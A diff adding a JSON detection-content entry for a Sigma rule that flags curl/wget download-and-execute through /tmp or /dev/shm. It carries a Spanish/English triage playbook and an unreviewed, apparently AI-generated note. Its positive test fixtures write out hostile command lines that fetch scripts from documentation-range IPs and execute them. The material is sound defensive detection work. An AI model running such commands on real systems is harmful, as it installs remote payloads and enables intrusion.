@@ -1,0 +1,133 @@
+{
+  "rule": {
+    "id": "a2d9e2f3-0f43-4c7a-bcd9-9acfc0d723aa",
+    "title": "Suspicious Download and Execute Pattern via Curl/Wget",
+    "level": "high",
+    "status": "experimental",
+    "author": "Aayush Gupta",
+    "path": "linux/process_creation/proc_creation_lnx_curl_wget_exec_tmp.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/linux/process_creation/proc_creation_lnx_curl_wget_exec_tmp.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1059.004",
+      "T1203"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un shell lanzado con 'sh -c' (o 'bash -c') ejecutó una línea de comandos que llama a curl o wget por ruta y usa /tmp/ o /dev/shm/. Esto suele indicar que se descargó un script a un directorio temporal y se ejecutó de inmediato.",
+      "what_it_detects": "Eventos de process_creation en Linux cuyo CommandLine incluye las tres cadenas: '/curl' o '/wget', '/tmp/' o '/dev/shm/', y 'sh -c'. Las tres deben aparecer en la misma línea de comandos.",
+      "why_it_matters": "Descargar y ejecutar en un solo paso es la forma habitual en que los stagers y droppers instalan cargas de segunda etapa, como mineros, bots o backdoors. Corresponde a la ejecución mediante Unix shell (T1059.004) y puede venir de la explotación de un servicio expuesto (T1203). /dev/shm reside en memoria y deja pocos rastros en disco.",
+      "triage_steps": [
+        "Lea el CommandLine completo y anote la URL, el dominio o IP de origen, la ruta de destino en /tmp o /dev/shm y lo que se ejecuta después de la descarga.",
+        "Revise ParentImage y la cadena de procesos padres. Que el padre sea un servidor web, una base de datos o java es muy sospechoso; un gestor de paquetes o cloud-init es menos preocupante.",
+        "Identifique al User. Preocupan más www-data, cuentas de servicio o root sin una sesión interactiva que lo justifique.",
+        "Investigue la URL y la IP en inteligencia de amenazas y en los logs de proxy o DNS. Busque la misma URL en otros hosts.",
+        "Si el archivo descargado sigue en /tmp o /dev/shm, obtenga su hash y revise su contenido de forma segura, sin ejecutarlo.",
+        "En el mismo host, en una ventana de +/- 15 minutos, busque procesos hijos, conexiones salientes, cambios en crontab o systemd, nuevas claves SSH y uso alto de CPU.",
+        "Busque alertas previas del mismo host, del mismo usuario y del mismo origen de descarga."
+      ],
+      "false_positives": [
+        "Scripts de actualización del sistema que descargan archivos temporales a /tmp y los ejecutan.",
+        "Instaladores con el patrón 'curl | sh' o herramientas de aprovisionamiento como cloud-init, Ansible o imágenes de CI que se ejecutan desde orígenes conocidos.",
+        "Pipelines de CI/CD o contenedores de build que descargan herramientas a /tmp durante el arranque."
+      ],
+      "response_steps": [
+        "Confirme con el responsable del sistema si la ejecución estaba prevista y si el dominio de origen es de confianza.",
+        "Si es maliciosa, aísle el host de la red y bloquee la URL y la IP en el proxy o el firewall.",
+        "Conserve evidencia: copie el archivo descargado, la lista de procesos y las conexiones antes de terminar los procesos.",
+        "Elimine los mecanismos de persistencia confirmados, como cron, servicios systemd o authorized_keys, y corrija la vulnerabilidad que se usó para entrar.",
+        "Rote las credenciales expuestas en el host y vigile si el indicador reaparece en otros equipos."
+      ],
+      "severity_rationale": "El nivel high es adecuado porque descargar y ejecutar código remoto desde directorios temporales en un solo comando es una técnica típica de intrusión y pocas veces lo hace software legítimo en servidores."
+    },
+    "en": {
+      "summary": "A shell started with 'sh -c' (or 'bash -c') ran a command line that calls curl or wget by path and uses /tmp/ or /dev/shm/. This usually means a script was downloaded to a temporary directory and run immediately.",
+      "what_it_detects": "Linux process_creation events whose CommandLine contains all three strings: '/curl' or '/wget', '/tmp/' or '/dev/shm/', and 'sh -c'. All three must appear in the same command line.",
+      "why_it_matters": "Downloading and running a file in one step is how stagers and droppers usually install second-stage payloads such as miners, bots or backdoors. This is Unix shell execution (T1059.004) and may follow exploitation of an exposed service (T1203). /dev/shm is memory-backed, so it leaves little on disk.",
+      "triage_steps": [
+        "Read the full CommandLine and note the URL, the source domain or IP, the destination path in /tmp or /dev/shm, and what runs after the download.",
+        "Check ParentImage and the parent process chain. A web server, database or java parent is highly suspicious; a package manager or cloud-init parent is less worrying.",
+        "Identify the User. Be more concerned about www-data, service accounts, or root without an interactive session that explains it.",
+        "Look up the URL and IP in threat intelligence and in proxy or DNS logs. Search for the same URL on other hosts.",
+        "If the downloaded file is still in /tmp or /dev/shm, hash it and review its content safely without running it.",
+        "On the same host within +/- 15 minutes, look for child processes, outbound connections, crontab or systemd changes, new SSH keys and CPU spikes.",
+        "Check for earlier alerts on the same host, the same user and the same download source."
+      ],
+      "false_positives": [
+        "System update scripts that download temporary files to /tmp and run them.",
+        "Installers using the 'curl | sh' pattern, or provisioning tools such as cloud-init, Ansible or CI images running from known sources.",
+        "CI/CD pipelines or build containers that download tools to /tmp during bootstrap."
+      ],
+      "response_steps": [
+        "Ask the system owner whether the run was expected and whether the source domain is trusted.",
+        "If it is malicious, isolate the host from the network and block the URL and IP at the proxy or firewall.",
+        "Preserve evidence before killing processes: copy the downloaded file and capture the process list and network connections.",
+        "Remove the persistence you confirm, such as cron jobs, systemd units or authorized_keys entries, and fix the vulnerability used to get in.",
+        "Rotate credentials exposed on the host and watch other hosts for the same indicators."
+      ],
+      "severity_rationale": "High fits because downloading and running remote code from a temporary directory in one command is a typical intrusion technique, and legitimate server software rarely does it."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "A web server worker spawns sh -c, which uses curl to download a script to /tmp and runs it.",
+        "event": {
+          "Image": "/usr/bin/dash",
+          "CommandLine": "sh -c /usr/bin/curl -fsSL http://203.0.113.10/x.sh -o /tmp/x.sh && chmod +x /tmp/x.sh && /tmp/x.sh",
+          "ParentImage": "/usr/sbin/apache2",
+          "User": "www-data",
+          "CurrentDirectory": "/var/www/html",
+          "ProcessId": 48211,
+          "Computer": "web-01"
+        }
+      },
+      {
+        "description": "bash -c uses wget to write a hidden payload to /dev/shm and runs it with sh.",
+        "event": {
+          "Image": "/usr/bin/bash",
+          "CommandLine": "/bin/bash -c /usr/bin/wget -q http://198.51.100.7/s -O /dev/shm/.s; sh /dev/shm/.s",
+          "ParentImage": "/usr/bin/java",
+          "User": "tomcat",
+          "CurrentDirectory": "/opt/tomcat",
+          "ProcessId": 30577,
+          "Computer": "app-02"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "An administrator runs curl by name (no '/curl' in the command line) to save an installer to /tmp, without sh -c.",
+        "event": {
+          "Image": "/usr/bin/curl",
+          "CommandLine": "curl -fsSL https://example.com/install.sh -o /tmp/install.sh",
+          "ParentImage": "/usr/bin/bash",
+          "User": "jperez",
+          "CurrentDirectory": "/home/jperez",
+          "ProcessId": 12045,
+          "Computer": "bastion-01"
+        }
+      },
+      {
+        "description": "A monitoring job uses sh -c with /usr/bin/curl but never touches /tmp or /dev/shm.",
+        "event": {
+          "Image": "/usr/bin/dash",
+          "CommandLine": "sh -c /usr/bin/curl -s https://updates.example.com/health | logger -t healthcheck",
+          "ParentImage": "/usr/sbin/cron",
+          "User": "root",
+          "CurrentDirectory": "/root",
+          "ProcessId": 9932,
+          "Computer": "web-01"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:55:13+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
